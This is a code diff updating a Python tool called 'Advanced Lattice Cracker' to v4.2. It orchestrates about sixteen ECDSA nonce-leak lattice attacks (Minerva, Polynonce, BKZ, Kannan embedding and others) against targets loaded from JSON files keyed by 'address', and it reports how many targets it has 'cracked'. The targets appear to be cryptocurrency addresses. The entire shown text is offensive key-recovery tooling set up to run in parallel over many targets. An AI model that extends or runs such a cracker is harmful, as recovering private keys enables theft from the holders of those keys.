-            try_attack(f"Polynonce {bb}-bit ({req} sigs)", solve_polynonce, pub, sigs[:req], bb)
-
-    # Monte Carlo — adaptive trials: scale by sig count, 30s time budget
-    if result is None and len(sigs) >= 15:
-        nsigs = len(sigs)
-        # More sigs → fewer trials needed (easier to find a good subset)
-        # Fewer sigs → fewer trials too (fewer unique subsets exist)
-        mc_configs = [
-            (32, min(nsigs, 15), min(60, max(10, nsigs))),
-            (16, min(nsigs, 26), min(40, max(8, nsigs // 2))),
-        ]
-        for bits, ss, trials in mc_configs:
-            if result is not None:
-                break
-            if nsigs < ss:
-                continue
-            try_attack(f"Monte Carlo {bits}-bit ({trials}x{ss})", solve_monte_carlo, pub, sigs, bits, trials, ss, 30)
+            queue_attack(f"Polynonce {bb}-bit ({req} sigs)", solve_polynonce, pub, raw_sigs[:req], bb)
 
     # SLA — adaptive iterations, 30s time budget
     if result is None and len(sigs) >= 15:
         nsigs = len(sigs)
         sla_configs = [
-            (32, min(nsigs, 15), min(40, max(8, nsigs))),
-            (16, min(nsigs, 26), min(30, max(6, nsigs // 2))),
+            (32, min(nsigs, 15), min(30, max(6, nsigs))),
+            (16, min(nsigs, 26), min(20, max(5, nsigs // 2))),
         ]
         for bits, ss, iters in sla_configs:
             if result is not None:
                 break
             if nsigs < ss:
                 continue
-            try_attack(f"SLA {bits}-bit ({iters}x{ss})", solve_sla, pub, sigs, bits, iters, ss, 30)
+            queue_attack(f"SLA {bits}-bit ({iters}x{ss})", solve_sla, pub, sigs, bits, iters, ss, 30)
 
     # Filtered Lattice
     if result is None and len(sigs) >= 5:
         for bits in [16, 8]:
             if result is not None:
                 break
-            try_attack(f"Filtered Lattice {bits}-bit ({len(sigs)} sigs)", solve_filtered_lattice, pub, sigs, bits)
+            queue_attack(f"Filtered Lattice {bits}-bit ({len(sigs)} sigs)", solve_filtered_lattice, pub, sigs, bits)
+
+    # Minerva Variable-Bitlength HNP (per-signature leak scaling)
+    if result is None and len(sigs) >= 5:
+        queue_attack(f"Minerva Variable-BL ({len(sigs)} sigs)", solve_minerva_variable, pub, sigs, sig_data)
+
+        flush_phase("PHASE 1: Fast (Polynonce + Babai CVP + SLA + Minerva)")
 
     # ════════════════ PHASE 2: STANDARD HNP ═══════════════════════════
     if result is None:
-        print(f"\n[PHASE 2] Standard HNP Attacks...", flush=True)
+        
 
         for w, s in [(32, 112), (32, 96), (16, 120)]:
             if result is not None:
@@ -1070,15 +1615,15 @@ def process_target(tgt):
             if len(sigs) < req:
                 continue
             use = min(len(sigs), req + 4)
-            try_attack(f"Middle-Bit w{w}@{s} ({use} sigs)", solve_middle_bits, pub, sigs[:use], w, s)
+            queue_attack(f"Middle-Bit w{w}@{s} ({use} sigs)", solve_middle_bits, pub, sigs[:use], w, s)
 
     if result is None:
-        for bias, req_s in [(64, 20), (48, 15)]:
+        for bias, req_s in [(64, 20), (48, 15), (32, 18)]:
             if result is not None:
                 break
-            if len(sigs) < req_s:
+            if len(raw_sigs) < req_s:
                 continue
-            try_attack(f"Linear Bias {bias}-bit ({req_s} sigs)", solve_linear_nonce, pub, sigs[:req_s], bias)
+            queue_attack(f"Linear Bias {bias}-bit ({req_s} sigs)", solve_linear_nonce, pub, raw_sigs[:req_s], bias)
 
     if result is None:
         for shared, req_s in [(32, 15), (64, 10)]:
@@ -1086,19 +1631,14 @@ def process_target(tgt):
                 break
             if len(sigs) < req_s:
                 continue
-            try_attack(f"Shared LSB {shared}-bit ({req_s} sigs)", solve_shared_lsb, pub, sigs[:req_s], shared)
+            queue_attack(f"Shared LSB {shared}-bit ({req_s} sigs)", solve_shared_lsb, pub, sigs[:req_s], shared)
 
-    if result is None:
-        for err, req_s in [(32, 18), (64, 12)]:
-            if result is not None:
-                break
-            if len(sigs) < req_s:
-                continue
-            try_attack(f"Sequential {err}-bit ({req_s} sigs)", solve_sequential_nonce, pub, sigs[:req_s], err)
+
+        flush_phase("PHASE 2: Standard HNP Attacks")
 
     # ════════════════ PHASE 3: DEEP REDUCTION ═════════════════════════
     if result is None:
-        print(f"\n[PHASE 3] Deep Reduction (Kannan + BKZ + RoundOff)...", flush=True)
+        
 
         for bits in [8, 6]:
             if result is not None:
@@ -1107,7 +1647,7 @@ def process_target(tgt):
             if len(sigs) < req:
                 continue
             use = min(len(sigs), req + 4)
-            try_attack(f"Kannan Embedding {bits}-bit ({use} sigs)", solve_kannan_embedding, pub, sigs[:use], bits, True)
+            queue_attack(f"Kannan Embedding {bits}-bit ({use} sigs)", solve_kannan_embedding, pub, sigs[:use], bits, True)
 
     if result is None:
         for bits in [8, 6]:
@@ -1117,10 +1657,12 @@ def process_target(tgt):
             if len(sigs) < req:
                 continue
             use = min(len(sigs), req + 4)
-            try_attack(f"Progressive-BKZ MSB {bits}-bit ({use} sigs)", solve_progressive_msb, pub, sigs[:use], bits)
-            try_attack(f"Progressive-BKZ LSB {bits}-bit ({use} sigs)", solve_progressive_lsb, pub, sigs[:use], bits)
+            queue_attack(f"Progressive-BKZ MSB {bits}-bit ({use} sigs)", solve_progressive_msb, pub, sigs[:use], bits)
+            queue_attack(f"Progressive-BKZ LSB {bits}-bit ({use} sigs)", solve_progressive_lsb, pub, sigs[:use], bits)
 
 
+
+        flush_phase("PHASE 3: Deep Reduction (Kannan + BKZ)")
 
     # ════════════════ RESULT ═══════════════════════════════════════════
     total_elapsed = time.time() - target_t0
@@ -1146,18 +1688,19 @@ def process_target(tgt):
         except Exception as e:
             print(f"   [-] FAILED to append to CSV: {e}", flush=True)
     else:
-        print(f"\n   [FAILED] All 15 attacks exhausted ({total_elapsed:.1f}s).", flush=True)
-        # Move failed JSON from pass -> processed
-        src = tgt.get('_source_file', '')
-        if src and os.path.isfile(src):
-            processed_dir = os.path.join(_SCRIPT_DIR, "reports", "processed")
-            os.makedirs(processed_dir, exist_ok=True)
-            dst = os.path.join(processed_dir, os.path.basename(src))
-            try:
-                shutil.move(src, dst)
-                print(f"   -> Moved to {dst}", flush=True)
-            except Exception as e:
-                print(f"   -> Failed to move: {e}", flush=True)
+        print(f"\n   [FAILED] All 16 attacks exhausted ({total_elapsed:.1f}s).", flush=True)
+
+    # Move JSON from pass -> processed (both success and failure)
+    src = tgt.get('_source_file', '')
+    if src and os.path.isfile(src):
+        processed_dir = os.path.join(_SCRIPT_DIR, "reports", "processed")
+        os.makedirs(processed_dir, exist_ok=True)
+        dst = os.path.join(processed_dir, os.path.basename(src))
+        try:
+            shutil.move(src, dst)
+            print(f"   -> Moved to {dst}", flush=True)
+        except Exception as e:
+            print(f"   -> Failed to move: {e}", flush=True)
 
     return {
         "result": result,
@@ -1167,84 +1710,103 @@ def process_target(tgt):
     }
 
 
+
 # ==============================================================================
 # MAIN ORCHESTRATOR — MULTIPROCESSING + ALL CORES
 # ==============================================================================
 def main():
+    global SKIP_GCD
+
+    parser = argparse.ArgumentParser(description="Advanced Lattice Cracker v4.2")
+    parser.add_argument("-gcd", action="store_true",
+                        help="Skip Phase 0 instant attacks (GCD + LCG)")
+    parser.add_argument("-w", "--workers", type=int, default=0,
+                        help="Number of parallel workers (0=auto, 1=sequential)")
+    args = parser.parse_args()
+
+    SKIP_GCD = args.gcd
+
     total_t0 = time.time()
-    # User requested to process only one address at a time sequentially
-    num_workers = 1
+
+    # Auto-detect workers: use all cores but cap at 4 for 8GB RAM safety
+    cores = cpu_count() or 1
+    if args.workers > 0:
+        num_workers = args.workers
+    else:
+        num_workers = min(cores, 4)  # Each worker can use ~1.5GB peak
 
     print("=" * 70)
-    print(" ADVANCED LATTICE CRACKER v4.0 — SEQUENTIAL PROCESSING")
-    print(f" 15 attacks | 8GB RAM Safe | MAX_SIGS={MAX_SIGS} | Workers={num_workers}")
-    print(f" CPU Cores Detected: {cpu_count() or '?'} | Using: {num_workers}")
+    print(" ADVANCED LATTICE CRACKER v4.2 — PARALLEL PROCESSING")
+    print(f" 16 attacks | 8GB RAM Safe | MAX_SIGS={MAX_SIGS} | Workers={num_workers}")
+    print(f" CPU Cores Detected: {cores} | Using: {num_workers}")
+    if SKIP_GCD:
+        print(f" FLAGS: -gcd (GCD + LCG attacks disabled)")
     print("=" * 70)
 
-    targets = []
     target_dir = os.path.join(_SCRIPT_DIR, "reports", "pass")
+    processed_dir = os.path.join(_SCRIPT_DIR, "reports", "processed")
+    os.makedirs(processed_dir, exist_ok=True)
 
     if not os.path.isdir(target_dir):
         print(f"[!] Not found: {target_dir}")
         print("[!] Run the analyzer first.")
         return
 
-    for fn in os.listdir(target_dir):
-        if fn.endswith(".json"):
-            fp = os.path.join(target_dir, fn)
-            try:
-                with open(fp, "r") as f:
-                    data = json.load(f)
-                    if isinstance(data, dict):
-                        if 'address' not in data:
-                            data['address'] = fn.replace('.json', '')
-                        data['_source_file'] = fp
-                        targets.append(data)
-                    elif isinstance(data, list):
-                        for item in data:
-                            if isinstance(item, dict):
-                                item['_source_file'] = fp
-                        targets.extend(data)
-            except (json.JSONDecodeError, IOError) as e:
-                logger.warning(f"Failed to load {fp}: {e}")
-                print(f"[!] Skipping bad JSON: {fn} ({e})")
+    global_recovered = 0
+    global_targets = 0
 
-    seen = set()
-    unique = []
-    for t in targets:
-        addr = t.get('address', '')
-        if addr not in seen:
-            seen.add(addr)
-            unique.append(t)
-    targets = unique
+    while True:
+        targets = []
+        for fn in os.listdir(target_dir):
+            if fn.endswith(".json"):
+                fp = os.path.join(target_dir, fn)
+                try:
+                    with open(fp, "r") as f:
+                        data = json.load(f)
+                        if isinstance(data, dict):
+                            if 'address' not in data:
+                                data['address'] = fn.replace('.json', '')
+                            data['_source_file'] = fp
+                            targets.append(data)
+                        elif isinstance(data, list):
+                            for item in data:
+                                if isinstance(item, dict):
+                                    if 'address' not in item:
+                                        item['address'] = fn.replace('.json', '')
+                                    item['_source_file'] = fp
+                                    targets.append(item)
+                except (json.JSONDecodeError, IOError) as e:
+                    logger.warning(f"Failed to load {fp}: {e}")
+                    print(f"[!] Skipping bad JSON: {fn} ({e})")
 
-    if not targets:
-        print("[!] No targets found!")
-        return
+        seen = set()
+        unique = []
+        for t in targets:
+            addr = t.get('address', '')
+            if addr not in seen:
+                seen.add(addr)
+                unique.append(t)
+        targets = unique
 
-    print(f"\n[*] Loaded {len(targets)} targets.\n")
-    processed_dir = os.path.join(_SCRIPT_DIR, "reports", "processed")
-    os.makedirs(processed_dir, exist_ok=True)
+        if not targets:
+            print("\n[!] No more targets found in reports/pass/. Exiting.")
+            break
 
-    # ── Run all targets in parallel ──────────────────────────────────────
-    recovered = []
-    if num_workers == 1 or len(targets) == 1:
-        # Single worker mode (no subprocess overhead)
-        results = [process_target(tgt) for tgt in targets]
-    else:
-        # Multiprocessing: one target per worker
-        with Pool(processes=num_workers) as pool:
-            results = pool.map(process_target, targets)
+        print(f"\n[*] Loaded {len(targets)} targets.\n")
 
-    for res in results:
-        if res is None:
-            continue
-        if res["success"]:
-            recovered.append(res["result"])
+        # ── Run targets ──────────────────────────────────────────────────────
+        recovered = []
+        for tgt in targets:
+            res = process_target(tgt, num_workers)
+            if res and res["success"]:
+                recovered.append(res["result"])
+                
+        global_recovered += len(recovered)
+        global_targets += len(targets)
 
     total_elapsed = time.time() - total_t0
     print(f"\n{'=' * 70}")
-    print(f"   SUMMARY: {len(recovered)} / {len(targets)} targets cracked")
+    print(f"   FINAL SUMMARY: {global_recovered} / {global_targets} targets cracked in total")
     print(f"   Total time: {total_elapsed:.1f}s | Workers: {num_workers}")
     print(f"{'=' * 70}")
 
